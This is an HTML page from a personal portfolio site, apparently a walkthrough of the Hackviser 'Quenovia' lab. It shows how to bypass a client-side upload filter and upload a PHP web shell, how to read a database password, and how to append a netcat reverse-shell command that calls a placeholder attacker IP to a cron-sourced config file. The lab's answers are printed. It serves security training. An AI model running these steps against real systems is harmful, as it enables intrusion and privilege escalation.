@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>aaronamran</title>
+    <link rel="icon" type="image/x-icon" href="/assets/img/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script
+        src="https://use.fontawesome.com/releases/v6.3.0/js/all.js"
+        crossorigin="anonymous"
+    ></script>
+    <!-- Google fonts-->
+    <link
+        href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700"
+        rel="stylesheet"
+        type="text/css"
+    />
+    <link
+        href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i"
+        rel="stylesheet"
+        type="text/css"
+    />
+	<!-- Core theme CSS (includes Bootstrap)-->
+	<link href="/css/styles.css" rel="stylesheet" />
+</head>
+<body id="page-top">
+    <!-- Navigation-->
+		<nav
+			class="navbar navbar-expand-lg navbar-dark bg-primary fixed-top"
+			id="sideNav"
+		>
+			<a class="navbar-brand js-scroll-trigger" href="#page-top">
+				<span id="navText" class="d-block d-lg-none">Portfolio</span>
+				<span class="d-none d-lg-block"
+					><img					id="profilePicture"						class="img-fluid img-profile rounded-circle mx-auto mb-2"
+						src="/assets/img/profile.jpg"
+						alt="Profile Picture"
+				/></span>
+			</a>
+			<button
+				class="navbar-toggler"
+				type="button"
+				data-bs-toggle="collapse"
+				data-bs-target="#navbarResponsive"
+				aria-controls="navbarResponsive"
+				aria-expanded="false"
+				aria-label="Toggle navigation"
+			>
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="navbarResponsive">
+				<ul class="navbar-nav">
+					<li class="nav-item">
+						<a class="nav-link js-scroll-trigger" href="/">About</a>
+					</li>
+					<li class="nav-item portfolio-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/ethicalhacking/">Ethical Hacking</a>
+					</li>
+					<li class="nav-item portfolio-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/hacking-labs/">Hacking Labs</a>
+					</li>
+					<li class="nav-item portfolio-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/projects/">Projects</a>
+					</li>
+					<li class="nav-item resume-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/experience/"
+							>Experience</a
+						>
+					</li>
+					<li class="nav-item resume-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/trainings/"
+							>Trainings</a
+						>
+					</li>
+					<li class="nav-item resume-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/certifications/"
+							>Certifications</a
+						>
+					</li>
+					<li class="nav-item resume-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/education/"
+							>Education</a
+						>
+					</li>
+					<!-- <li class="nav-item resume-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/skills/">Skills</a>
+					</li> -->
+					<li class="nav-item resume-nav-item">
+						<a class="nav-link js-scroll-trigger" href="/activities/"
+							>Activities</a
+						>
+					</li>
+				</ul>
+			</div>
+		</nav>
+<main id="articleContent" class="container" style="padding:2rem 0rem; max-width:1000px;">
+	<header class="pb-4">
+        <a href="/hacking-labs/hackviser/" class="btn btn-outline-light">Return</a>
+        <button id="scrollToBottom" class="btn btn-outline-light ms-2" onclick="scrollToBottom()">
+            <i class="fas fa-arrow-down"></i> Scroll to Bottom
+        </button>
+    </header>
+	<div class="d-flex justify-content-start align-items-center mb-3">
+		<img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_logo.png" alt="Quenovia logo" style="height:64px; width:auto; margin-left:0; margin-right:16px; flex:0 0 auto;" />
+		<h2 class="mb-0 fw-semibold">Quenovia</h2>
+	</div>
+	<h3 class="mb-2 text-muted">Hackviser</h3>
+    <div class="subheading mb-4">March 2026 · Warmup Stage 3</div>
+    <p class="lead mb-4">On Linux systems, a "cronjob" is a scheduling service used to automatically run commands or scripts at specific times. It is recommended to practice exploiting a vulnerability in a web application to get a reverse shell from the machine, and to practice privilege escalation attacks that result from misconfiguring a scheduled task on the machine.</p>
+    
+	<h4 class="mb-3">Tasks</h4>
+	<p class="mb-2"><strong>Question 1:</strong> What is the site title?</p>
+    <p class="mb-3">Open the target site in a web browser and see the title in the browser tab.</p>
+	<img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image1.png" alt="Quenovia Image 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-5"><strong>Answer:</strong> Quenovia</p>
+
+	<p class="mb-2"><strong>Question 2:</strong> Which file types are allowed to be uploaded to the profile photo field in the visa application?</p>
+    <p class="mb-3">Click Apply for Visa, then scroll down to the Profile Photo section, and click Browse. Notice that the allowed file types are displayed in the file selection dialog.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image2.png" alt="Quenovia Image 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-5"><strong>Answer:</strong> Image</p>
+
+    <p class="mb-2"><strong>Question 3:</strong> What is the database password?</p>
+    <p class="mb-3">We need to exploit a vulnerability in the web application to gain access to the database. We can attempt to use file upload functionality to upload a malicious file that will give us access. Let's attempt to allow the web application to allow uploads of other file types by inspecting the Browse functionality, and changing <code>accept="image/*"</code> to <code>accept="*"</code>.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image3.png" alt="Quenovia Image 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-3">Then we upload p0wny-shell.php (<a href="https://github.com/flozz/p0wny-shell" target="_blank" referrerpolicy="no-referrer">GitHub repository here</a>). Fill up the other details too with dummy information to prevent errors in receiving our application.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image4.png" alt="Quenovia Image 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image5.png" alt="Quenovia Image 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-3">Apparently directory listing is enabled on the vulnerable web application. This makes it easier for us to access our web shell.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image6.png" alt="Quenovia Image 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-3">Now we can open our web shell in a new tab and since it is interactive, we can directly enter necessary commands to find the database file. After some browsing, we encounter the <code>db_connect.php</code> file.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image7.png" alt="Quenovia Image 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image8.png" alt="Quenovia Image 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-5"><strong>Answer:</strong> c2e5-4b76-812c</p>
+
+    <p class="mb-2"><strong>Question 4:</strong> What is the full path to the file containing system-wide scheduled tasks (cron jobs)?</p>
+    <p class="mb-5"><strong>Answer:</strong> /etc/crontab</p>
+
+    <p class="mb-2"><strong>Question 5:</strong> What is the name of the command or script that is run once per minute as a scheduled task (cron job)?</p>
+    <p class="mb-3">We can just run <code>cat /etc/crontab</code> to analyse the contents of the cron jobs.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image9.png" alt="Quenovia Image 9" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-5"><strong>Answer:</strong> clean_logs.sh</p>
+
+    <p class="mb-2"><strong>Question 6:</strong> Which date was the database backup taken?</p>
+    <p class="mb-3">Next, we need to find the backup directory. After some browsing, we discover that the backup directory is located at <code>/backups</code>. Listing out the contents reveals a SQL backup file. However, our attempt of reading it is unsuccessful due to lack of permissions.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image10.png" alt="Quenovia Image 10" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-3">Using our previous finding of the clean_logs.sh file, let's analyse the contents of the shell script. The script reveals that the /var/www/config.conf file was executed via the <code>source</code> command. We then check for the permissions of the clean_logs.sh file and of the config.conf file.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image11.png" alt="Quenovia Image 11" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-3">It turns out that the config file is writable by the current logged in user (<code>www-data</code>). The next step is to achieve a reverse shell. First lets enable a listener on our local machine using <code>nc -lnvp 1337</code>.</p>
+    <p class="mb-3">We can use <code>echo "nc [Attacker IP address] 1337 -e /bin/bash" >> /var/www/config.conf</code> and once the cronjob runs, we get a connection on our local machine.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image12.png" alt="Quenovia Image 12" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-3">Now that we receive a connection, we have successfully achieved a reverse shell. Use <code>whoami</code> to verify the current user, and use <code>pwd</code> to check the current directory. Then navigate accordingly and use <code>head visa_applications.sql.backup.sql</code> to view the contents of the backup file.</p>
+    <img src="/assets/hackinglabs/hackviser/quenovia/quenovia_hackviser_image13.png" alt="Quenovia Image 13" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
+    <p class="mb-5"><strong>Answer:</strong> 14.06.2023</p>
+    
+
+	<hr />
+	<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
+		<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the <a href="/hacking-labs/hackviser/">next Hacking Lab</a>.</p>
+		<p class="mb-0" style="font-weight:700;">— @aaronamran</p>
+		<p class="text-muted small mt-1">March 2026</p>
+	</section>
+
+
+	<footer class="pt-4">
+		<a href="/hacking-labs/hackviser/" class="btn btn-outline-light">Return</a>
+		<button id="scrollToTop" class="btn btn-outline-light ms-2" onclick="scrollToTop()">
+			<i class="fas fa-arrow-up"></i> Scroll to Top
+		</button>
+	</footer>
+</main>
+<div id="stars"></div>
+<div id="stars2"></div>
+<script src="/js/scripts.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+</body>
+</html>
